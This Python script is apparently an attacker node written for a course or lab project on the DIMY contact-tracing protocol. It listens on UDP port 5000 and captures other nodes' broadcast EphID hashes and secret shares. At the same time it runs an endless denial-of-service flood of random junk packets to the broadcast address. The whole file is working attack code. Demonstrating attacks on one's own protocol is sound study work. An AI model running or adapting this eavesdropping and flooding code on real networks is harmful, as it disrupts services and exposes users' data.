import socket
import json
import udp_handler
from crypto_utils import get_ephid_hash
import time
import random
import string
import threading

def run_attacker():
    print("--- DIMY Attacker Node Active ---")
    print("[Info] Listening for all UDP broadcasts on port 5000...")

    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        if hasattr(socket, 'SO_REUSEPORT'):
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
        
        sock.bind(('', 5000))

        while True:
            data, addr = sock.recvfrom(65535)
            try:
                packet = json.loads(data.decode('utf-8'))
                ephid_hash = packet['hash']
                x = packet['x']
                y = packet['y']

                print(f"\n[Eavesdropped] From: {addr[0]}")
                print(f"    Hash : {ephid_hash}")
                print(f"    Share: (x={x}, y={y[:10]}...)")
                
            except Exception as e:
                continue

def run_dos_attack(target_ip='255.255.255.255', target_port=5000):
    print(f"[Attack] Starting DoS flood on {target_ip}:{target_port}...")
    
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        
        while True:
            fake_hash = ''.join(random.choices(string.hexdigits, k=16))
            junk_payload = {
                "hash": fake_hash,
                "x": random.randint(1, 100),
                "y": random.randint(10**70, 10**80)
            }
            
            message = json.dumps(junk_payload).encode('utf-8')
            sock.sendto(message, (target_ip, target_port))
            
            time.sleep(0.01)

if __name__ == "__main__":
    dos_thread = threading.Thread(target=run_dos_attack, daemon=True)
    dos_thread.start()
    run_attacker()